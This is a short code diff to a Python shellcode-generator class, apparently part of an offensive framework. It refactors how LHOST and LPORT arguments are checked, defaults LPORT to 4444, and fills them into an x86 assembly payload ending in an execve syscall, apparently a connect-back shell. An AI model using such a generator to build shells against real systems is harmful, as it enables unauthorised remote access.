@@ -26,12 +26,20 @@ class Shellcode():
 
     def __init__(self, arg_object):
 
-        self.arg_dict = argument_check(Shellcode.arguments,
-                                       arg_object["positional arguments"])
+        self.arg_list = arg_object["positional arguments"]
 
     def get_shellcode(self):
         """TODO
         """
+
+        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
+        if (argv_dict == None):
+            exit(-1)
+
+        if ("LPORT" not in argv_dict.keys()):
+            lport = 4444
+        else:
+            lport = argv_dict["LPORT"]
 
         sc_builder = Assembler('x86')
 
@@ -99,8 +107,8 @@ class Shellcode():
             mov al,0xb            ; execve syscall
             int 0x80
         """
-        ).format(hex(ip_str_to_inet_addr(self.arg_dict["LHOST"])),
-                 hex(port_str_to_htons(self.arg_dict["LPORT"])))
+        ).format(hex(ip_str_to_inet_addr(argv_dict["LHOST"])),
+                 hex(port_str_to_htons(lport)))
 
 
         return sc_builder.get_bytes_from_asm(source_code)
